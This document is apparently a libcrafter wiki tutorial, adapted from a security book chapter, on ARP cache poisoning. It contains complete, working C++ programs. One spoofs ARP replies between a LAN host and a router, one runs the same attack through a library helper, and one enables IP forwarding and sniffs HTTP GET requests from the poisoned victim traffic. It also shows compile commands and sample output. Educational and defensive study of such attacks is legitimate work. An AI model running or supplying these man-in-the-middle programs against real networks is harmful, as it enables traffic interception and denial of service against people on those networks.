# Introduction #

_Adapted from Security Power Tools, by Bryan Burns et al. Copyright 2007 O’Reilly Media, Inc., 978-0-596-00963-2 - Chapter 6_

ARP Cache Poisoning is a type of attack where a machine can be convinced to send
packets to the wrong address on a network. On IP/Ethernet networks, operating systems need to map IP addresses to Ethernet (MAC) addresses in their local network, either to send the packet directly when both are on the same LAN or through a gateway. This mapping is built dynamically with ARP requests. In order to keep ARP requests to a minimum, operating systems maintain an ARP cache that stores the mapping for a given time, usually two minutes, after which a new ARP request would be done if the peer needed to be reached again. ARP cache poisoning is a technique that consists of inserting false information into the cache of a target. When the operating system tries to reach an IP address whose entry has been corrupted, a bad Ethernet address will be used and the packet will not go where it should.

This technique has a huge potential to mess up your LAN for several minutes if you don't setup correctly IP forwarding on the attacker's system. There is plenty of information online about this technique and how to perform it in the correct way.

Technically, ARP cache poisoning is done by sending wrong information through the
ARP protocol. ARP is a protocol designed to bind together two addresses of different levels but from the same host. In our case, it will bind Ethernet and IP addresses. All we have to do is to send hosts bad associations and hope they will put it in their cache.

The following code performs a very simple ARP poisoning attack relying on ARP replies (forward and backward) between two hosts (a LAN machine and a LAN router) and serves as an illustration of how the technique works:

```
#include <iostream>
#include <string>
#include <signal.h>
#include <crafter.h>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

volatile byte spoof = 1;

void ctrl_c(int dummy) {
	spoof = 0;
}

int main() {

	/* Set the interface */
	string iface = "wlan0";

	/* Get the IP address associated to the interface */
	string MyIP = GetMyIP(iface);
	/* Get the MAC Address associated to the interface */
	string MyMAC = GetMyMAC(iface);

	/* Host A IP address */
	string hostA = "192.168.1.4";
	/* HOst B IP address */
	string hostB = "192.168.1.1";

	/* This will send an ARP request for obtain HostA and HostB MAC address */
	string macA = GetMAC(hostA,iface);
	string macB = GetMAC(hostB,iface);

	/* Check if the hosts are alive */
	if(macA.size() == 0) {
		cout << "[@] Host " << hostA << " down. Aborting" << endl;
		return 1;
	}
	if(macB.size() == 0) {
		cout << "[@] Host " << hostB << " down. Aborting" << endl;
		return 1;
	}

	/* Print some info */
	cout << "[@] Attacker: " << MyIP  << " : " << MyMAC << endl;
	cout << "[@] HostA   : " << hostA << " : " << macA  << endl;
	cout << "[@] HostB   : " << hostB << " : " << macB  << endl;

	/* --------- Common data to all headers --------- */

	Ethernet ether_header;
	ether_header.SetSourceMAC(MyMAC);     // <-- Put my MAC as a source

	ARP arp_header;
	arp_header.SetOperation(ARP::Reply);  // <-- Set Operation (ARP Reply)

        /* ---------------------------------------------- */

	/*
	 * NOTE: Remember that each packet keeps its own copy of
	 * each layer pushed. So, you can safely modify later
	 * the <layer object> that was pushed on the packet.
	 */

	/* [++++++++++] --- Create packet for host A */
	Packet packetA;

	/* Put ethernet header information */
	ether_header.SetDestinationMAC(macA);

	/* Fill ARP header */
	arp_header.SetSenderIP(hostB);
	arp_header.SetSenderMAC(MyMAC);       // <-- Spoof IP address of host B
	arp_header.SetTargetIP(hostA);
	arp_header.SetTargetMAC(macA);

	/* Push both headers */
	packetA.PushLayer(ether_header);
	packetA.PushLayer(arp_header);
	/* Done packet for A ---------- [+++++++++++] */

	/* [++++++++++] --- Create packet for host B */
	Packet packetB;

	/* Put ethernet header information */
	ether_header.SetDestinationMAC(macB);

	/* Fill ARP header */
	arp_header.SetSenderIP(hostA);
	arp_header.SetSenderMAC(MyMAC);        // <-- Spoof IP address of host A
	arp_header.SetTargetIP(hostB);
	arp_header.SetTargetMAC(macB);

	/* Push both headers */
	packetB.PushLayer(ether_header);
	packetB.PushLayer(arp_header);
	/* Done packet for B ---------- [+++++++++++] */

	/* Set the signal handler */
	signal(SIGINT,ctrl_c);

	/* Loop until ctrl-c is pressed */
	while(spoof) {
		/* Send both packets */
		packetA.Send(iface);
		packetB.Send(iface);
		/* Wait a few seconds */
		sleep(5);
	}

	cout << "[@] Done! " << endl;

	return 0;
}
```

If you compile and execute the above code, the program will place your machine in the network segment between the router (192.168.1.1) and the machine with the IP 192.168.1.4. If you don't enable IP forwarding (by executing `echo 1 > /proc/sys/net/ipv4/ip_forward`) the attack will result in a denial of service to the IP 192.168.1.4.

The library provides a more efficient and convenient way to perform the technique shown above, by using the built-in function ARPSpoofingReply:

  * `ARPContext* ARPSpoofingReply(const std::string& net_target, const std::string& net_victim, const std::string& iface="")`
    * `net_target` : Set of IP addresses in nmap style that defines the target net. The target network usually consists of few hosts that are servers (DNS, HTTP, telnet, etc) or is the router on a LAN.
    * `net_victim` : Set of IP addresses in nmap style that defines the victim net. The victim network usually consists of  hosts that are not servers i.e. computers on a LAN.
    * `iface` : Network interface ("wlan0", "eth0", and so on).

As a reference, there is also the function:

  * `ARPContext* ARPSpoofingRequest(const std::string& net_target, const std::string& net_victim, const std::string& iface="")` : A more efficient technique is to use ARP requests, instead of ARP replies. Indeed, many network stacks have tightened their acceptance policy to insert an IP/MAC couple into the cache. Thus, using ARP requests for cache poisoning has the best acceptance rate across all OSes, including when the IP address is already present (cache updating)

A few conventions for both functions:

  * If your IP address (attacker) is contained in one of the two networks, will be removed.
  * If an IP address is contained in both networks will be removed from the victim network.
  * If an IP address does not respond to ARP requests (i.e. the IP address is not assigned to any computer) will be removed from the list no matter in which network is contained.

The above code is "equivalent" to:

```
#include <iostream>
#include <string>
#include <crafter.h>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

int main() {

	/* Set the interface */
	string iface = "wlan0";

	/* Host A IP address */
	string hostA = "192.168.1.4";
	/* HOst B IP address */
	string hostB = "192.168.1.1";

	/*
	 * Begin the ARP poisoning (Sending false ARP replies)
	 * hostB and hostA could be wildcards like:
	 * - 192.168.1.*
	 * - 192.168.1.3-19,192.168.1.200
	 * - etc...
	 */
	ARPContext* context = ARPSpoofingReply(hostB,hostA,iface);
	/*
	 * The function returns immediately, it spawns a thread "on the background"
	 * that does the ARP poisoning
	 */

	/* You can print the information of the context */
	PrintARPContext(*context);

	/* ----------------------------------------------------------------------- */

	/*
	 * Here you can do anything you can think of while the ARP poisoning occurs
	 */
         sleep(10);

	/* ----------------------------------------------------------------------- */

	/*
	 * Finally, clean the context... This will try to fix the ARP tables sending
	 * ARP Replies
	 */
	CleanARPContext(context);

	return 0;
}
```

Compile and run the program:

```
g++ arppoison.cpp -o arppoison
sudo ./arppoison
```

You should see in your screen something like this:

```
[@] --- ARP Spoofer 
[@] Attacker's MAC address = 1c:65:9d:0f:*:*
[@] --- Victim network 
 IP : 192.168.1.4 ; MAC : 08:00:27:28:*:*
[@] --- Target network 
 IP : 192.168.1.1 ; MAC : 00:02:cf:7b:*:*
```

The above displayed message is due to the PrintARPContext function. Prints information about the attack.

> After ten seconds, due to the CleanARPContext function call, this message is displayed:

```
[@] Terminating ARPSpoofing. Trying to fix the ARP tables. 
[@] Done cleaning up the ARPSpoofer.
```

In addition to printing this message, the function tries to fix the ARP tables by the same method used to poison them.

# Sniffer + ARP Cache Poisoning #

The next example shows how to sniff HTTP GET requests from an entire LAN by performing an ARP Poisoning attack to every host of the network (we activate the ip forwarding from the program using the `system` call).

```
#include <iostream>
#include <string>
#include <crafter.h>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

/* Function for handling a packet */
void PacketHandler(Packet* sniff_packet, void* user) {
	/* sniff_packet -> pointer to the packet captured */
	/* user -> void pointer to the data supplied by the user */

	/* Check if there is a payload */
	RawLayer* raw_payload = sniff_packet->GetLayer<RawLayer>();
	if(raw_payload) {

		/* You can get the payload as a string */
		string payload = raw_payload->GetStringPayload();

		/* Print the payload only if the <GET> world is inside */
		if(payload.find("GET") != string::npos) {
			/* Print relevant data from the connection */
			TCP* tcp_layer = sniff_packet->GetLayer<TCP>();
			IP* ip_layer = sniff_packet->GetLayer<IP>();

			cout << ip_layer->GetSourceIP()      << ":" << tcp_layer->GetSrcPort() << " -> " <<
					ip_layer->GetDestinationIP() << ":" << tcp_layer->GetDstPort()
				  << endl << endl;

            /* Print the HTTP request */
			cout << payload << endl;

			cout << "[+] ------- [+]" << endl;
		}

	}
}

/* Global reference of the ARPContext */
ARPContext* global_context;

/* Global reference of the sniffer */
Sniffer* global_sniff;

/* Handling a CTRL-C */
void ctrl_c(int dummy) {
	/* Cancel the sniffer */
	global_sniff->Cancel();
	/* And shutdown the ARP poisoner */
	CleanARPContext(global_context);
}

/* Activate the IP forwarding */
void set_ipforward() {
	system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");
}

/* Reset the IP forward */
void reset_ipforward() {
	system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
}

int main() {

	/* Set the interface */
	string iface = "wlan0";

	/* Host A IP address */
	string victim_net = "192.168.0.106";
	/* HOst B IP address */
	string router = "192.168.0.1";

	/* ----------------------------------------------------------------------- */

	/* Set IP forward */
	set_ipforward();

	/*
	 * Begin the ARP poisoning (Sending false ARP requests)
	 */
	global_context = ARPSpoofingReply(router,victim_net,iface);
	/*
	 * The function returns immediately, it spawns a thread "on the background"
	 * that does the ARP poisoning
	 */

	/* You can print the information of the context */
	PrintARPContext(*global_context);

	/* ----------------------------------------------------------------------- */

	/* Create a sniffer */
	Sniffer sniff("ip and tcp and port 80",iface,PacketHandler);

	/* Set the global reference */
	global_sniff = &sniff;

	/* Set the signal handler */
	signal(SIGINT,ctrl_c);

	/* And capture ad-infinitum (until CTRL-C is pressed) */
	sniff.Capture(-1);

	/* ----------------------------------------------------------------------- */

	/* Reset IP forward */
	reset_ipforward();

	cout << "[@] Main done. " << endl;

	return 0;
}
```

[Next Recommended Tutorial : DNS Spoofing](http://code.google.com/p/libcrafter/wiki/DNSSpoofing)